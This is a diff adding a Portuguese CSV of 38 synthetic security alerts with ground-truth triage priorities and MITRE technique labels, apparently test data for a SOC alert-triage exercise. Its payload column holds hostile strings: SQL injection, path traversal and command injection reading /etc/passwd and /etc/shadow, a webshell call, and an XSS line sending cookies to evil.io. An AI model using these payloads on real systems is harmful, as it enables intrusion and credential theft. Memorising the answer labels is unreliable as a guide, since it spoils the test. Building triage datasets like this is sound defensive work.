@@ -1,0 +1,39 @@
+id,timestamp,origem,ip_origem,ip_destino,porta_destino,protocolo,payload,descricao,severidade_fonte,prioridade_real,tecnica_real
+ALT-0001,2026-03-15T08:00:00,IDS,203.0.113.10,10.0.1.5,443,TCP,' OR 1=1--,SQL injection em formulario de login,high,ALTA,T1190
+ALT-0002,2026-03-15T08:03:00,IDS,198.51.100.23,10.0.1.5,443,TCP,"1 UNION SELECT username,password FROM users",SQL injection com UNION SELECT,high,ALTA,T1190
+ALT-0003,2026-03-15T08:07:00,IDS,203.0.113.77,10.0.1.8,80,TCP,../../../../etc/passwd,Path traversal para /etc/passwd,high,ALTA,T1005
+ALT-0004,2026-03-15T08:11:00,IDS,192.0.2.44,10.0.1.8,80,TCP,; cat /etc/shadow #,Command injection em parametro,critical,ALTA,T1059
+ALT-0005,2026-03-15T08:15:00,IDS,10.0.2.30,8.8.8.8,53,UDP,TXT query 4096 bytes base64,Exfiltracao volumosa via DNS,high,ALTA,T1048
+ALT-0006,2026-03-15T08:20:00,IDS,203.0.113.90,10.0.1.2,22,TCP,Failed password for root (200x),Brute force SSH 200 tentativas,high,ALTA,T1110
+ALT-0007,2026-03-15T08:25:00,IDS,10.0.2.15,203.0.113.200,443,TCP,GET /api/health a cada 60s p/ dominio novo,Beaconing C2 periodico,high,ALTA,T1071
+ALT-0008,2026-03-15T08:30:00,IDS,198.51.100.5,10.0.1.5,443,TCP,<script>fetch('//evil.io?c='+document.cookie)</script>,XSS armazenado em comentario,high,ALTA,T1190
+ALT-0009,2026-03-15T08:34:00,IDS,203.0.113.15,10.0.1.5,443,TCP,POST shell.php cmd=whoami,Upload de webshell,critical,ALTA,T1190
+ALT-0010,2026-03-15T08:38:00,IDS,198.51.100.88,10.0.1.5,443,TCP,400 logins falhos 50 usuarios,Credential stuffing multiplas contas,high,ALTA,T1110
+ALT-0011,2026-03-15T08:42:00,IDS,192.0.2.99,10.0.1.9,8080,TCP,rO0ABXNyABFqYXZhLnV0aWwu,Deserializacao insegura Java,critical,ALTA,T1190
+ALT-0012,2026-03-15T08:46:00,IDS,203.0.113.44,10.0.1.20,3389,TCP,svc_backup login 03:14 origem externa,Acesso conta servico horario atipico,high,ALTA,T1078
+ALT-0013,2026-03-15T08:50:00,IDS,198.51.100.14,10.0.1.10,0,TCP,SYN scan sequencial,Port scan 25 portas,medium,MEDIA,T1046
+ALT-0014,2026-03-15T08:55:00,IDS,203.0.113.60,10.0.1.2,22,TCP,Failed password user admin (12x),Multiplas falhas login 12x,medium,MEDIA,T1110
+ALT-0015,2026-03-15T09:00:00,IDS,10.0.2.22,198.51.100.77,443,TCP,Conexao dominio registrado ha 2 dias,Trafego HTTPS destino novo,medium,MEDIA,T1071
+ALT-0016,2026-03-15T09:04:00,IDS,192.0.2.33,10.0.1.5,80,TCP,GET /.env,Tentativa acesso arquivo config,medium,MEDIA,T1005
+ALT-0017,2026-03-15T09:08:00,IDS,198.51.100.41,10.0.1.20,443,TCP,Usuario BR autenticou de outro pais,Login geolocalizacao incomum,medium,MEDIA,T1078
+ALT-0018,2026-03-15T09:12:00,IDS,10.0.2.44,203.0.113.150,443,TCP,350MB para storage externo,Volume upload acima do normal,medium,MEDIA,T1048
+ALT-0019,2026-03-15T09:16:00,Email GW,0.0.0.0,10.0.3.10,25,SMTP,Link para banco-seguro-brasil.co,Email phishing marca similar,medium,MEDIA,T1566
+ALT-0020,2026-03-15T09:20:00,IDS,203.0.113.31,10.0.1.9,8080,TCP,GET /api/users/[1-500],Enumeracao de usuarios API,medium,MEDIA,T1046
+ALT-0021,2026-03-15T09:24:00,IDS,198.51.100.62,10.0.1.5,80,TCP,GET /admin /backup /.git (40 404s),Scan de diretorios,medium,MEDIA,T1046
+ALT-0022,2026-03-15T09:28:00,IDS,192.0.2.71,10.0.1.30,3389,TCP,RDP de IP publico nao cadastrado,Conexao RDP externa,medium,MEDIA,T1078
+ALT-0023,2026-03-15T09:32:00,IDS,10.0.3.15,10.0.1.2,22,TCP,Failed password (2x) depois sucesso,Login falho isolado 2x,low,BAIXA,T1110
+ALT-0024,2026-03-15T09:36:00,Scanner,10.0.1.5,0.0.0.0,443,TCP,Cert expira em 7 dias,Certificado TLS proximo expiracao,low,BAIXA,
+ALT-0025,2026-03-15T09:40:00,IDS,198.51.100.99,10.0.1.5,80,TCP,curl/7.68 em endpoint publico,User-agent incomum,low,BAIXA,
+ALT-0026,2026-03-15T09:44:00,IDS,10.0.3.22,10.0.1.15,443,TCP,Usuario interno 22:30 VPN,Acesso fora do horario interno,low,BAIXA,T1078
+ALT-0027,2026-03-15T09:48:00,IDS,10.0.2.5,10.0.1.1,0,ICMP,Ping continuo host interno,Trafego ICMP elevado,low,BAIXA,
+ALT-0028,2026-03-15T09:52:00,IDS,10.0.2.18,10.0.1.12,8443,TCP,Conexao porta 8443 servico interno,Porta alta incomum,low,BAIXA,
+ALT-0029,2026-03-15T09:56:00,IDS,10.0.2.9,8.8.8.8,53,UDP,Lookup dominio pouco acessado,Consulta DNS dominio raro,low,BAIXA,
+ALT-0030,2026-03-15T10:00:00,Scanner,10.0.4.10,10.0.1.5,443,TCP,Nessus scan janela aprovada,Scanner de vulnerabilidade agendado,medium,FALSO_POSITIVO,
+ALT-0031,2026-03-15T10:04:00,IDS,10.0.2.50,10.0.4.20,445,TCP,Transferencia 2GB p/ storage interno,Backup automatico noturno,medium,FALSO_POSITIVO,
+ALT-0032,2026-03-15T10:08:00,IDS,10.0.1.1,10.0.1.5,443,TCP,GET /health a cada 30s,Health check load balancer,low,FALSO_POSITIVO,
+ALT-0033,2026-03-15T10:12:00,IDS,10.0.3.30,0.0.0.0,443,TCP,Download de update.microsoft.com,Atualizacao Windows Update,low,FALSO_POSITIVO,
+ALT-0034,2026-03-15T10:16:00,IDS,10.0.2.11,10.0.4.1,123,UDP,Sync servidor de tempo interno,Sincronizacao NTP,low,FALSO_POSITIVO,
+ALT-0035,2026-03-15T10:20:00,IDS,10.0.4.5,10.0.4.6,443,TCP,Failover simulado documentado,Teste de DR agendado,medium,FALSO_POSITIVO,
+ALT-0036,2026-03-15T10:24:00,IDS,10.0.5.10,10.0.1.5,443,TCP,SQLi de IP da equipe red team,Pentest autorizado equipe interna,high,FALSO_POSITIVO,T1190
+ALT-0037,2026-03-15T10:28:00,IDS,10.0.4.30,10.0.1.5,8080,TCP,Agente coletando metricas,Monitoramento APM,low,FALSO_POSITIVO,
+ALT-0038,2026-03-15T10:32:00,EDR,10.0.3.40,0.0.0.0,0,TCP,Arquivo de teste EICAR detectado,Antivirus quarentena EICAR,medium,FALSO_POSITIVO,
